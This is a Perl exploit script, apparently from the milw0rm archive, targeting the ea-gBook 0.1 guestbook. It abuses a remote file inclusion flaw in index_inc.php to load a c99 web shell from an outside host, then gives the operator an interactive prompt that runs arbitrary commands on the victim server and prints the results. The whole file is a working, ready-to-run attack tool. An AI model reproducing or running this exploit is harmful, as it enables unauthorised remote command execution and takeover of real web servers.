#!/usr/bin/perl
####################################################################
# ea-gBook 0.1 Remote Command Execution with RFI (c99) Exploit
# Vendor: http://ea-style.de/
# Download: http://ea-style.de/eddy/index.php?action=down_gbook_agb
#
# Author: bd0rk
# Contact: bd0rk[at]hackermail.com
# site: http://www.soh-crew.it.tt
# thanks Joss for the code.
#
####################################################################
#
#
# RFI vuln!: /ea-gBook/index_inc.php line 22
# include ($inc_ordner . "config.php");
#
####################################################################

use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] ea-gBook 0.1 Remote Command Execution with RFI (c99) Exploit\n";
	print "[x] by bd0rk\n";
	print "[x] bd0rk[at]hackermail[dot]com\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/ea-gBook/index_inc.php?inc_ordner=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

# milw0rm.com [2009-02-13]
